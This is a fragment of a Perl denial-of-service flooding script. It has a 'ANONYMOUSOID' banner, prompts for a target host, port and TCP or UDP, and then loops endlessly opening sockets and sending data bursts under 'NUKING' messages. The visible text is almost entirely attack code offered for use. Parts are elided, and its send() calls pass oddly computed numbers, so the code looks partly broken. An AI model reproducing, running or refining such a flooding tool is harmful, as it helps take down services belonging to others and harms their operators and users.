...
print BLUE  q{ 
 ...
 (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_O_I_D_!_> 
        )_/        \          / 
       (@           `--------` Welcome! 
...
print "PORT ==> $port";
print "\n===============================";
print BLUE BOLD "\n[~] Enter Protocall (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Enter Protocall (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
...
system("clear || cls");
print GREEN "\n[*] Attack Has Been Started On [$host:$port] proto => [$proto].......\n\n";
sleep(1);
while (1) {
  if(grep{$proto eq $_} 'TCP','tcp'){
       $sock = IO::Socket::INET->new(
        ...
        for($i=0; $i<=500; $i++){
            ...
            print RED ("NUKING: (=>$host:$port~$proto<=) Packets sent: $size\n");
            ...
            $size = rand() * 8921873 * 99919988;
            print RED BOLD UNDERLINE   ("NUKING:  (=>$host:$port~$proto<=)  Packets sent: $size\n");
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
